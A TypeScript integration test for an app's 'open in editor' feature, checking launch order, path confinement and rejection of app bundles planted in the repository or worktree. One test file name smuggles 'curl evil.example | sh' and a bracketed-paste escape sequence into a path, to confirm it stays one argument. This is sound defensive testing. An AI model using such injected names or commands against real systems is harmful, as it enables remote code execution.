// Open in editor in core against stand-in programs: core assembled as main.ts assembles it, on a temp KEA_HOME, with an
// editor host that points only into a temp folder. The "editors", `open`, `mdfind` and `gh` there are
// tools/fake-editor's: each records the argv it was run with and opens nothing. No real editor, browser or terminal app
// is ever looked for or started.

import fs from 'node:fs'
import os from 'node:os'
import path from 'node:path'
import { EDITOR_DEFS, TERMINAL_APP_DEFS, type EditorDef } from '@kea/core/src/editor/catalog.ts'
import type { BundleHost, CommandHost } from '@kea/core/src/editor/host.ts'
import type { EditorList, EditorOpenResult, SessionView } from '@kea/protocol'
import { installBundle, installTool, readCalls, writeBundles, type FakeCall } from '@kea-tools/fake-editor/src/index.ts'
import { afterEach, describe, expect, it, vi } from 'vitest'
import { helperBinary } from '../support/holders.ts'
import { createArgs, repo, startSessions, type SessionsUnderTest } from './core-sessions-support.ts'

let cleanup: (() => unknown)[] = []
afterEach(async () => {
  for (const c of cleanup.splice(0).reverse()) await c()
})

const def = (id: string): EditorDef => EDITOR_DEFS.find((d) => d.id === id) as EditorDef

/** A host whose every path is inside `root`; a test changes its fields between cases. */
interface TestHost extends BundleHost {
  appDirs: string[]
  mdfind: string | null
  open: string
  ghPath: string | null
}

function world() {
  const root = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'kea-editors-')))
  cleanup.push(() => fs.rmSync(root, { recursive: true, force: true }))
  const log = path.join(root, 'calls.ndjson')
  const host: TestHost = { kind: 'bundles', appDirs: [path.join(root, 'Applications')], mdfind: null, open: path.join(root, 'bin', 'open'), ghPath: null, gh: () => host.ghPath }
  let seen = 0
  return {
    root,
    log,
    host,
    apps: path.join(root, 'Applications'),
    /** What ran since the last look: `[tool, ...argv]` each, and where. */
    calls(): { run: string[]; cwd: string }[] {
      const all = readCalls(log)
      const fresh = all.slice(seen)
      seen = all.length
      return fresh.map((c: FakeCall) => ({ run: [c.tool, ...c.argv], cwd: c.cwd }))
    },
    /** Remove every stand-in app and tool. */
    clear(): void {
      fs.rmSync(path.join(root, 'Applications'), { recursive: true, force: true })
      fs.rmSync(path.join(root, 'Elsewhere'), { recursive: true, force: true })
      fs.rmSync(path.join(root, 'bin'), { recursive: true, force: true })
      host.mdfind = null
      host.ghPath = null
    },
  }
}

async function create(s: SessionsUnderTest, projectId: string, prompt: string, more: Record<string, unknown> = {}): Promise<SessionView> {
  const r = await s.call<{ sessionId: string }>('sessions.create', createArgs(projectId, prompt, more))
  const v = await s.until(r.sessionId, 'creation settles', (x) => x.lifecycle === 'live' || x.lifecycle === 'create_failed')
  if (v.lifecycle !== 'live') throw new Error(`creation failed: ${v.creation?.error}`)
  return v
}

describe('open in editor', () => {
  it('I-ED-1 · no editor: a plain "unavailable"; a bundled CLI: the worktree, a file in its window, a position, a:1 through open -a <the bundle>; found by bundle id only, inside an applications folder: open -a <that bundle>, and a bundle Spotlight lists anywhere else (another folder, the repository, the worktree) is never used; each strategy tried in order until one works, and when all fail the last one’s stderr; the default editor, the terminal app, gh pr create, and what a path may reach', async () => {
    const w = world()
    const s = await startSessions({ opts: { helperPath: await helperBinary(), agentIntake: false, editorHost: w.host } })
    cleanup.push(() => s.dispose())
    const r = repo()
    cleanup.push(() => r.dispose())
    const p = await s.project(r.root)
    const v = await create(s, p.id, 'edit')
    const cwd = v.cwd
    const open = (req: Record<string, unknown>) => s.call<EditorOpenResult>('editor.open', { target: 'session', id: v.id, ...req })
    const list = (fresh = true) => s.call<EditorList>('editor.list', { fresh })

    fs.mkdirSync(path.join(cwd, 'src', 'my notes'), { recursive: true })
    fs.writeFileSync(path.join(cwd, 'src', 'login.ts'), 'x')
    fs.writeFileSync(path.join(cwd, 'src', 'my notes', 'naïve — 日本.md'), 'x')
    fs.writeFileSync(path.join(cwd, 'a:1'), 'x')
    fs.symlinkSync('/etc/hosts', path.join(cwd, 'hosts-link')) // os-ok: test data

    // ── nothing installed: a predictable state, not an error; nothing is run ──
    expect(await list()).toEqual({ editors: [], default: null, configured: { id: 'vscode', name: 'VS Code' }, terminalApp: null, gh: false })
    expect(await open({})).toEqual({ ok: false, editor: 'vscode', reason: 'unavailable', message: null })
    expect(await open({ editor: 'zed' })).toEqual({ ok: false, editor: 'zed', reason: 'unavailable', message: null })
    expect(await s.call('editor.openTerminalApp', { target: 'session', id: v.id })).toEqual({ ok: false, reason: 'unavailable', message: null })
    expect(await s.call('editor.createPR', { sessionId: v.id })).toEqual({ ok: false, reason: 'noGh', message: null })
    expect(w.calls()).toEqual([])

    // ── VS Code with its bundled CLI, `code` not on PATH ──
    const code = def('vscode')
    const bundle = installBundle(w.apps, code, { log: w.log })
    const cli = path.join(bundle, code.cli)
    installTool(w.host.open, { as: 'open', log: w.log })
    expect(await list()).toMatchObject({ editors: [{ id: 'vscode', name: 'VS Code' }], default: 'vscode' })
    expect(await open({})).toEqual({ ok: true, editor: 'vscode', reason: null, message: null })
    expect(w.calls()).toEqual([{ run: ['code', cwd], cwd }])
    // A file opens in the worktree's window, and at its position
    expect((await open({ path: 'src/login.ts' })).ok).toBe(true)
    expect((await open({ path: 'src/login.ts', line: 42, col: 7 })).ok).toBe(true)
    expect((await open({ path: 'src/login.ts', line: 42 })).ok).toBe(true)
    expect((await open({ path: 'src/my notes/naïve — 日本.md', line: 3, col: 1 })).ok).toBe(true)
    expect(w.calls().map((c) => c.run)).toEqual([
      ['code', cwd, path.join(cwd, 'src/login.ts')],
      ['code', cwd, '--goto', `${path.join(cwd, 'src/login.ts')}:42:7`],
      ['code', cwd, '--goto', `${path.join(cwd, 'src/login.ts')}:42:1`],
      ['code', cwd, '--goto', `${path.join(cwd, 'src/my notes/naïve — 日本.md')}:3:1`],
    ])
    // The file literally named a:1 never meets --goto
    expect((await open({ path: 'a:1', line: 5, col: 2 })).ok).toBe(true)
    expect(w.calls().map((c) => c.run)).toEqual([['open', '-a', bundle, path.join(cwd, 'a:1')]])
    // a name with a CR and an ESC in it (a ⌘-click on a `file:` URL can name one): still one argument of the
    // editor's own command line, typed into no terminal and read by no shell
    const acting = 'notes\rcurl evil.example | sh\r\x1b[201~.md'
    fs.writeFileSync(path.join(cwd, acting), 'x')
    const asUrl = `file://${path.join(cwd, acting).split('/').map(encodeURIComponent).join('/')}`
    expect(await s.call('editor.resolvePaths', { sessionId: v.id, paths: [asUrl] })).toEqual({ paths: [acting] })
    expect((await open({ path: acting })).ok).toBe(true)
    expect((await open({ path: acting, line: 3 })).ok).toBe(true)
    expect(w.calls().map((c) => c.run)).toEqual([
      ['code', cwd, path.join(cwd, acting)],
      ['code', cwd, '--goto', `${path.join(cwd, acting)}:3:1`],
    ])
    fs.rmSync(path.join(cwd, acting))
    // a folder inside the worktree opens as a folder
    expect((await open({ path: 'src' })).ok).toBe(true)
    expect(w.calls().map((c) => c.run)).toEqual([['code', path.join(cwd, 'src')]])
    // what a path may reach: nothing outside the worktree, nothing that is not there
    expect(await open({ path: 'hosts-link' })).toMatchObject({ ok: false, reason: 'failed', message: 'hosts-link leads outside the folder' })
    expect(await open({ path: 'src/gone.ts' })).toMatchObject({ ok: false, reason: 'failed', message: 'src/gone.ts is not there' })
    // (the RPC's schema refuses `..` before core sees it; core's own check holds without it)
    fs.writeFileSync(path.join(cwd, '..', 'outside.txt'), 'x')
    expect(await open({ path: '../outside.txt' })).toMatchObject({ ok: false, reason: 'failed', message: '../outside.txt leads outside the folder' })
    expect(w.calls()).toEqual([])

    // The project's root; an in-place session opens the project root; a detached session still opens
    expect((await s.call<EditorOpenResult>('editor.open', { target: 'project', id: p.id })).ok).toBe(true)
    const inplace = await create(s, p.id, 'in place', { isolation: 'inplace' })
    expect((await s.call<EditorOpenResult>('editor.open', { target: 'session', id: inplace.id })).ok).toBe(true)
    await s.call('sessions.stop', { id: v.id })
    await s.until(v.id, 'detached', (x) => x.lifecycle === 'detached')
    expect((await open({})).ok).toBe(true)
    expect(w.calls().map((c) => c.run)).toEqual([
      ['code', p.rootPath],
      ['code', p.rootPath],
      ['code', cwd],
    ])

    // ── the strategies in order: the CLI fails, `open -a <the bundle>` works (the app is named by the accepted
    // bundle's path, never by its id or by a URL scheme's handler) ──
    installTool(cli, { as: 'code', log: w.log, exit: 1, stderr: 'code: cannot start' })
    expect(await open({ path: 'src/login.ts', line: 2, col: 3 })).toEqual({ ok: true, editor: 'vscode', reason: null, message: null })
    expect(w.calls().map((c) => c.run)).toEqual([
      ['code', cwd, '--goto', `${path.join(cwd, 'src/login.ts')}:2:3`],
      ['open', '-a', bundle, path.join(cwd, 'src/login.ts')],
    ])
    // ── every strategy fails: all three were tried, and the answer carries the last one's stderr ──
    installTool(w.host.open, { as: 'open', log: w.log, exit: 1, stderr: 'LSOpenURLsWithRole() failed with error -10814' })
    expect(await open({ path: 'src/login.ts', line: 2, col: 3 })).toEqual({ ok: false, editor: 'vscode', reason: 'failed', message: 'LSOpenURLsWithRole() failed with error -10814' })
    expect(w.calls().map((c) => c.run)).toEqual([
      ['code', cwd, '--goto', `${path.join(cwd, 'src/login.ts')}:2:3`],
      ['open', '-a', bundle, path.join(cwd, 'src/login.ts')],
      ['open', '-a', bundle, `vscode://file${path.join(cwd, 'src/login.ts')}:2:3`],
    ])
    // a tool that is not there at all is a failed attempt too, with a reason
    fs.rmSync(w.host.open)
    const none = await open({ path: 'a:1' })
    expect(none).toMatchObject({ ok: false, editor: 'vscode', reason: 'failed' })
    expect(none.message).toMatch(/spawn .*open failed/)
    expect(w.calls()).toEqual([])

    // ── found by its bundle id only (Spotlight): in a subfolder of the applications folder, with no CLI inside ──
    w.clear()
    const tools = installBundle(path.join(w.apps, 'Tools'), { appName: code.appName, bundleId: code.bundleId }, { log: w.log })
    // what Spotlight lists outside the applications folders is never used: not a bundle in some other folder, and not
    // one inside the project's repository or the session's worktree (each with a CLI that would run)
    const cursorDef = def('cursor')
    const windsurfDef = def('windsurf')
    const elsewhere = installBundle(path.join(w.root, 'Elsewhere'), cursorDef, { log: w.log })
    const inRepo = installBundle(path.join(p.rootPath, 'tools'), windsurfDef, { log: w.log })
    const inWorktree = installBundle(path.join(cwd, 'tools'), { appName: 'Ghostty.app', bundleId: 'com.mitchellh.ghostty' }, { log: w.log })
    w.host.mdfind = installTool(path.join(w.root, 'bin', 'mdfind'), {
      as: 'mdfind',
      log: w.log,
      bundles: writeBundles(path.join(w.root, 'bundles.json'), { [code.bundleId]: tools, [cursorDef.bundleId]: elsewhere, [windsurfDef.bundleId]: inRepo, 'com.mitchellh.ghostty': inWorktree, 'dev.zed.Zed': path.join(w.apps, 'Gone.app') }),
    })
    installTool(w.host.open, { as: 'open', log: w.log })
    // a bundle Spotlight still lists but that is gone is not installed
    expect(await list()).toMatchObject({ editors: [{ id: 'vscode', name: 'VS Code' }], default: 'vscode', terminalApp: null })
    const asked = w.calls()
    expect(asked).toHaveLength(1)
    expect(asked[0]?.run.slice(0, 3)).toEqual(['mdfind', '-attr', 'kMDItemCFBundleIdentifier'])
    for (const d of [...EDITOR_DEFS, ...TERMINAL_APP_DEFS]) expect(asked[0]?.run[3], d.bundleId).toContain(`'${d.bundleId}'`)
    expect((await open({})).ok).toBe(true)
    // the bundle Spotlight's id led to, by its path: a bundle with the same id elsewhere (a repository's) cannot be
    // what the system picks
    expect(w.calls().map((c) => c.run)).toEqual([['open', '-a', tools, cwd]])
    // asked for by name, the bundles outside the applications folders are not installed, and nothing of theirs runs
    expect(await open({ editor: 'cursor' })).toEqual({ ok: false, editor: 'cursor', reason: 'unavailable', message: null })
    expect(await open({ editor: 'windsurf' })).toEqual({ ok: false, editor: 'windsurf', reason: 'unavailable', message: null })
    expect(await s.call('editor.openTerminalApp', { target: 'session', id: v.id })).toEqual({ ok: false, reason: 'unavailable', message: null })
    expect(w.calls()).toEqual([])
    for (const planted of [inRepo, inWorktree]) fs.rmSync(path.dirname(planted), { recursive: true, force: true })
    // Within the cache's life nothing is looked up again
    expect(await list(false)).toMatchObject({ default: 'vscode' })
    expect(w.calls()).toEqual([])

    // ── only Cursor installed: it is the default while the setting is untouched, and VS Code is not listed ──
    w.clear()
    const cursor = def('cursor')
    const cursorCli = path.join(installBundle(w.apps, cursor, { log: w.log }), cursor.cli)
    installTool(w.host.open, { as: 'open', log: w.log })
    expect(await list()).toMatchObject({ editors: [{ id: 'cursor', name: 'Cursor' }], default: 'cursor', configured: { id: 'vscode', name: 'VS Code' } })
    expect(await open({})).toMatchObject({ ok: true, editor: 'cursor' })
    expect(fs.existsSync(cursorCli)).toBe(true)
    expect(w.calls().map((c) => c.run)).toEqual([['cursor', cwd]])
    // an editor that is not installed, asked for by name, is "unavailable"
    expect(await open({ editor: 'vscode' })).toEqual({ ok: false, editor: 'vscode', reason: 'unavailable', message: null })

    // ── the setting decides; a chosen editor that is not installed is no default ──
    const zed = def('zed')
    installBundle(w.apps, zed, { log: w.log, as: 'zed' })
    await s.call('settings.set', { key: 'general.defaultEditor', value: 'zed' })
    expect(await list()).toMatchObject({ editors: [{ id: 'cursor' }, { id: 'zed' }], default: 'zed', configured: { id: 'zed', name: 'Zed' } })
    expect(await open({ path: 'src/login.ts', line: 9, col: 4 })).toMatchObject({ ok: true, editor: 'zed' })
    expect(await open({ editor: 'cursor' })).toMatchObject({ ok: true, editor: 'cursor' })
    expect(w.calls().map((c) => c.run)).toEqual([
      ['zed', cwd, `${path.join(cwd, 'src/login.ts')}:9:4`],
      ['cursor', cwd],
    ])
    await s.call('settings.set', { key: 'general.defaultEditor', value: 'windsurf' })
    expect(await list()).toMatchObject({ default: null, configured: { id: 'windsurf', name: 'Windsurf' } })
    expect(await open({})).toEqual({ ok: false, editor: 'windsurf', reason: 'unavailable', message: null })
    expect(w.calls()).toEqual([])

    // ── the terminal app, first found in the catalog's order ──
    const terminal = installBundle(w.apps, { appName: 'Terminal.app', bundleId: 'com.apple.Terminal' }, { log: w.log })
    expect((await list()).terminalApp).toEqual({ name: 'Terminal' })
    const ghostty = installBundle(w.apps, { appName: 'Ghostty.app', bundleId: 'com.mitchellh.ghostty' }, { log: w.log })
    expect((await list()).terminalApp).toEqual({ name: 'Ghostty' })
    expect(await s.call('editor.openTerminalApp', { target: 'session', id: v.id })).toEqual({ ok: true, reason: null, message: null })
    expect(await s.call('editor.openTerminalApp', { target: 'project', id: p.id })).toEqual({ ok: true, reason: null, message: null })
    expect(w.calls().map((c) => c.run)).toEqual([
      ['open', '-a', ghostty, cwd],
      ['open', '-a', ghostty, p.rootPath],
    ])
    expect(fs.existsSync(terminal)).toBe(true)

    // ── session.createPR: gh in the session's worktree; a session with no branch has nothing to open one for ──
    w.host.ghPath = installTool(path.join(w.root, 'bin', 'gh'), { as: 'gh', log: w.log })
    expect((await list(false)).gh).toBe(true)
    expect(await s.call('editor.createPR', { sessionId: v.id })).toEqual({ ok: true, reason: null, message: null })
    expect(w.calls()).toEqual([{ run: ['gh', 'pr', 'create', '--web'], cwd }])
    expect(await s.call('editor.createPR', { sessionId: inplace.id })).toEqual({ ok: false, reason: 'noBranch', message: null })
    installTool(w.host.ghPath, { as: 'gh', log: w.log, exit: 1, stderr: 'aborted: you must first push the current branch to a remote, or use the --head flag' })
    expect(await s.call('editor.createPR', { sessionId: v.id })).toEqual({ ok: false, reason: 'failed', message: 'aborted: you must first push the current branch to a remote, or use the --head flag' })

    // ── which printed paths are files of the session ──
    expect(await s.call('editor.resolvePaths', { sessionId: v.id, paths: ['src/login.ts', path.join(cwd, 'a:1'), '../x', 'hosts-link', 'src'] })).toEqual({ paths: ['src/login.ts', 'a:1', null, null, null] })
    expect(await s.call('editor.resolvePaths', { sessionId: 'S0000000000000000000000000', paths: ['src/login.ts'] }).catch(() => ({ paths: [null] }))).toEqual({ paths: [null] })
    expect(s.c.core.editors.resourceCounts).toMatchObject({ detecting: 0, launches: 0 })
  })

  it('I-PLT-9 · where an app is a command (Linux): the editor’s command and the one beside a desktop entry’s program are found, never one inside the project or the worktree; the worktree, a file and a position go to its command-line tool with argv, its URL to xdg-open when it fails; a terminal app is started detached in the folder with its folder argument', async () => {
    const root = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'kea-editors-cmd-')))
    cleanup.push(() => fs.rmSync(root, { recursive: true, force: true }))
    const log = path.join(root, 'calls.ndjson')
    const bin = path.join(root, 'bin')
    const known: Record<string, string[]> = {}
    const host: CommandHost = { kind: 'commands', searchPath: false, knownPlaces: (c) => known[c] ?? [], dataDirs: () => [path.join(root, 'share')], open: path.join(bin, 'xdg-open'), gh: () => null }
    const s = await startSessions({ opts: { helperPath: await helperBinary(), agentIntake: false, editorHost: host } })
    cleanup.push(() => s.dispose())
    const r = repo()
    cleanup.push(() => r.dispose())
    const p = await s.project(r.root)
    const v = await create(s, p.id, 'edit')
    const cwd = v.cwd
    fs.mkdirSync(path.join(cwd, 'src'), { recursive: true })
    fs.writeFileSync(path.join(cwd, 'src', 'login.ts'), 'x')
    let seen = 0
    const calls = (): { run: string[]; cwd: string }[] => {
      const all = readCalls(log)
      const fresh = all.slice(seen)
      seen = all.length
      return fresh.map((c: FakeCall) => ({ run: [c.tool, ...c.argv], cwd: c.cwd }))
    }
    const open = (req: Record<string, unknown>) => s.call<EditorOpenResult>('editor.open', { target: 'session', id: v.id, ...req })
    const list = () => s.call<EditorList>('editor.list', { fresh: true })

    // VS Code as a command; Zed through its desktop entry (its window binary in libexec, its CLI in bin beside it);
    // a `cursor` inside the project and a `windsurf` inside the worktree, offered as known places: never used
    known.code = [installTool(path.join(bin, 'code'), { as: 'code', log })]
    const zedApp = path.join(root, 'zed.app')
    installTool(path.join(zedApp, 'libexec', 'zed-editor'), { as: 'zed-editor', log })
    installTool(path.join(zedApp, 'bin', 'zed'), { as: 'zed', log })
    fs.mkdirSync(path.join(root, 'share', 'applications'), { recursive: true })
    fs.writeFileSync(path.join(root, 'share', 'applications', 'dev.zed.Zed.desktop'), `[Desktop Entry]\nType=Application\nName=Zed\nExec=${path.join(zedApp, 'libexec', 'zed-editor')} %U\n`)
    known.cursor = [installTool(path.join(p.rootPath, 'tools', 'cursor'), { as: 'cursor', log })]
    known.windsurf = [installTool(path.join(cwd, 'tools', 'windsurf'), { as: 'windsurf', log })]
    installTool(host.open, { as: 'xdg-open', log })
    expect(await list()).toMatchObject({ editors: [{ id: 'vscode' }, { id: 'zed' }], default: 'vscode', terminalApp: null })
    for (const editor of ['cursor', 'windsurf'] as const) expect(await open({ editor })).toEqual({ ok: false, editor, reason: 'unavailable', message: null })

    expect((await open({})).ok).toBe(true)
    expect((await open({ path: 'src/login.ts', line: 42, col: 7 })).ok).toBe(true)
    expect((await open({ path: 'src/login.ts', line: 3, editor: 'zed' })).ok).toBe(true)
    expect((await s.call<EditorOpenResult>('editor.open', { target: 'project', id: p.id })).ok).toBe(true)
    expect(calls()).toEqual([
      { run: ['code', cwd], cwd },
      { run: ['code', cwd, '--goto', `${path.join(cwd, 'src', 'login.ts')}:42:7`], cwd },
      { run: ['zed', cwd, `${path.join(cwd, 'src', 'login.ts')}:3:1`], cwd },
      { run: ['code', p.rootPath], cwd: p.rootPath },
    ])
    // the CLI fails: the editor's URL goes to xdg-open; both fail: the last one's stderr
    installTool(known.code[0]!, { as: 'code', log, exit: 1, stderr: 'code: cannot start' })
    expect((await open({ path: 'src/login.ts', line: 2, col: 3 })).ok).toBe(true)
    installTool(host.open, { as: 'xdg-open', log, exit: 4, stderr: 'xdg-open: no method available for opening it' })
    expect(await open({})).toEqual({ ok: false, editor: 'vscode', reason: 'failed', message: 'xdg-open: no method available for opening it' })
    expect(calls().map((c) => c.run)).toEqual([
      ['code', cwd, '--goto', `${path.join(cwd, 'src', 'login.ts')}:2:3`],
      ['xdg-open', `vscode://file${path.join(cwd, 'src', 'login.ts')}:2:3`],
      ['code', cwd],
      ['xdg-open', `vscode://file${cwd}`],
    ])

    // kitty, started detached in the folder with its folder argument; core does not wait for it
    known.kitty = [installTool(path.join(bin, 'kitty'), { as: 'kitty', log })]
    expect((await list()).terminalApp).toEqual({ name: 'kitty' })
    expect(await s.call('editor.openTerminalApp', { target: 'session', id: v.id })).toEqual({ ok: true, reason: null, message: null })
    await vi.waitFor(() => expect(readCalls(log).length).toBe(seen + 1), { timeout: 10_000, interval: 20 })
    expect(calls()).toEqual([{ run: ['kitty', '--directory', cwd], cwd }])
    expect(s.c.core.editors.resourceCounts).toMatchObject({ detecting: 0, launches: 0 })
  })
})
